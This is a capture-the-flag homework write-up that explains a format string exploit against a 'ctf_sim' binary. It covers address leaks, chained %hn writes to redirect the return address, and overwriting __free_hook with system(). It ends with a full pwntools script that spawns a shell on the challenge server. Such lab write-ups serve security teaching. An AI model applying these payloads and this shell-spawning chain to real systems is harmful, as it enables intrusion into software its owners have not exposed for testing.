# Homework 10a Writeup (without `giveup()`)
![bruh](/hw10a/image-1.png)

## A Quick Look 
![Alt text](/hw10a/image-2.png)

Sums up every CTF challenge so far ![emoji](https://blob.cat/emoji/custom/blobcats/blobcatgooglytrash.png)

As a rule of thumb we will run `checksec` on the binary:

![Alt text](/hw10a/image-6.png)

Looks scary ![emoji](https://blob.cat/emoji/custom/blobcats/ablobcatsweatsiphard.gif)

The vulnerability could be easily found in the source code if you're using the `clangd` lauguage server in your editor:

![Alt text](/hw10a/image-4.png)

It reads the "name of the snack" into a buffer [in the heap]{.spoiler} then `printf`s it as the format string itself. It appears to be an easy format string attack challenge. We will try some generic payloads:

![Alt text](/hw10a/image-5.png)

Looks like we got some addresses on the stack to bypass ASLR ![emoji](https://blob.cat/emoji/custom/blobcats/blobcatglowsticks.png). Now we have to figure out how to do our abritrary write, so that we can overwrite the GOT entry of a libc function with the address of `system()`.


## Where did my payload go ![emoji](https://blob.cat/emoji/custom/blobcats/blobcatsob.png)

Let's run it on `gdb` and see what the stack looks like when we enter our payload:

![Alt text](/hw10a/image-7.png)

The text we entered is nowhere to be found on the stack. But we can see a pointer to our payload `AAAA...` on the **heap**.  If we look back at the source code, we can see that the `buffer` string is allocated on the heap using `malloc()`.

But in order to execute an abritrary write using format strings (and the `%n` format specifier), the address to be written is specified at an argument, meaning it must also be on the stack. If we tried use `fmtstr_payload()` from pwntools, it will just write to the location pointed by some pointers on the stack.

How about the `name` buffer at the start of the program? Can we put the target addresses into it? It is indeed stored on the stack, but **before** we can leak our address from the buffer to bypass ASLR. If we manage to modify it *after* we leak the address, then we could do the abritrary write. But how?

Is there a good way to return to the `ctf_simulator` function, without calling `giveup()`? Well, to *control the flow*, we could only overwrite either a GOT entry, or the return address of the function at `rbp+1`. Back to square one ![emoji](https://blob.cat/emoji/custom/blobcats/blobcatangery.png)


## Chaining the overwrites

A trick I learned from [the MIPS ROP challenge](/hkcert#mips-rop-gldanoob) is to make use of the existing values on the stack which are deterministic. In this case it means we can utilize those pointer values to control another value on the stack. For example, the value at `rbp` (`0x7fffffffd650`) refers to the saved `rbp` (`rbp + 0x120`), which points to the base of the previous stack frame. What if we used the format string exploit with the pointer at `rbp`? The value at base of the previous stack frame (which also is a pointer to the stack) get overwritten.

```
[rbp] (8th arg)  -> rbp + 0x120
...
(Stack frame of ctf_simulator())
...
[rbp + 0x120]     -> 0x7fffffffd780
```


Let's try overwriting it with the format specifier `%1c%8$hn` (writing `0x0001` to the address pointed by the 8th argument):

```
[rbp + 0x120] -> 0x7fffffff0001
```

We have another address on the stack, differing from the previous by the lower bytes (first two bytes in memory). What makes it even better is that we can just make it point to `rbp+1`, by just altering those two bytes with `%54872c%10$hn`:

```
[rbp + 0x120] -> 0x7fffffffd658 = rbp + 1
```
(The exact value of `rbp` can be calculated using the leaked stack address from earlier)

Now we have a pointer to the return address (`rbp + 1`) on the stack! Using it as the argument to the format string exploit, we can overwrite the return address with `ctf_simulator` using the same trick:

```
[rbp + 1]     -> ctf_simulator()
...
[rbp + 0x120] -> rbp + 1
```

Now the program will ask us for the team name again once the `get_snack` function exits.

## Full RELRO... or not?

Now that we had our abritary overwrite using the `name` buffer, we can use the leaked address from earlier to calculate the address of the GOT table, 
and leak the address of `puts()` in memory with `%10$s`, thus obtaining the address of `system()`:

![](/hw10a/image-9.png)

However there is a problem: the binary is compiled with full RELRO, meaning the GOT table is read-only. We can't simply overwrite any GOT entry with the address of `system()`. But if we're lucky and the LIBC version on the server is older, there's a chance the LIBC calls a function pointer `__free_hook` (which can be user defined) when freeing chunks on the heap.

We can check the LIBC version using <https://libc.blukat.me/> with our leaked address:

![Alt text](/hw10a/image-8.png)

The LIBC version is older than 2.34, so we can use the `__free_hook` trick and overwrite it with the address of `system()` ![emoji](https://blob.cat/emoji/custom/blobcats/blobcatglowsticks.png). We'll use the `name` buffer again, since the output of `fmtstr_payload()` has to be on the stack.

One last thing is to get `system()` to be called with the argument `/bin/sh`. But since whatever is being freed is also passed to `__free_hook`, which in this case happenes to be `buffer`, we can just put `/bin/sh` as the name of our snack.

## Solution
1. Leak the base address of the binary and the saved RBP
2. Using two format string exploits, overwrite the return address of the `get_snacks()` call with `ctf_simulator`
3. Leak the address of `puts()` by setting `name` to `puts@GOT` and calculate the address of `system()`
4. Return to `ctf_simulator` again, set `__free_hook` to the address of `system()`
5. Enter `/bin/sh` as the name of the snack, wait for `buffer` to be freed and `cat flag.txt`

```py
import sys

from pwn import *  # type: ignore

mode = 'l'
if len(sys.argv) > 1:
    mode = sys.argv[1]

e = ELF('./ctf_sim')
libc = ELF('./libc.so.6')
context.binary = e

if mode == 'r':
    p = connect('chal.firebird.sh', 35048)
else:
    p = process([e.path])


p.sendline(b'AAAAAAAAAAAAAAAAA')


def ret_to_ctf():
    # after leaking rbp and setting e.address

    # rbp $8 -> rbp+0x120 $44 -> rbp+0x130
    # make rbp+0x120 point to return address (rbp+8)
    p.sendlineafter(b'option: ', b'3')
    payload = '%{}c%{}$hn'.format((rbp + 8) & 0xffff, 8)
    p.sendlineafter(b'today? ', payload)

    # edit return address to start of ctf_simulator
    p.sendlineafter(b'option: ', b'3')
    payload = '%{}c%{}$hn'.format(e.sym['ctf_simulator'] + 15 & 0xffff, 44)
    p.sendlineafter(b'today? ', payload)


# Leak RBP of ctf_simulator & Return address
p.sendlineafter(b'option: ', b'3')
p.sendlineafter(b'today? ', b'%8$payo%9$pez')
p.recvuntil(b'0x')
rbp = int(p.recvuntil('ayo', drop=True).strip(), 16) - 0x120
ret = int(p.recvuntil('ez', drop=True).strip(), 16)
print('RBP: ', hex(rbp))
print('Return address: ', hex(ret))
# Set the base address of ELF
e.address = ret - e.sym['ctf_simulator'] - 166


ret_to_ctf()
p.pack(e.got['puts'])
p.sendline()

# Leak puts
p.sendlineafter(b'option: ', b'3')
p.sendlineafter(b'today? ', b'%10$sAAAA')
puts = unpack(p.recvuntil('AAAA', drop=True), 'all')
print('PUTS: ', hex(puts))
libc.address = puts - libc.sym['puts']
hook = libc.sym['__free_hook']
print('HOOK: ', hex(hook))


ret_to_ctf()
# Overwrite __free_hook with system
payload = fmtstr_payload(10, {hook: libc.sym['system']})
p.sendline(payload)

p.sendlineafter(b'option: ', b'3')
p.sendlineafter(b'today? ', payload)
p.sendlineafter(b'option: ', b'3')
p.sendlineafter(b'today? ', '/bin/sh\x00')
p.interactive()
```

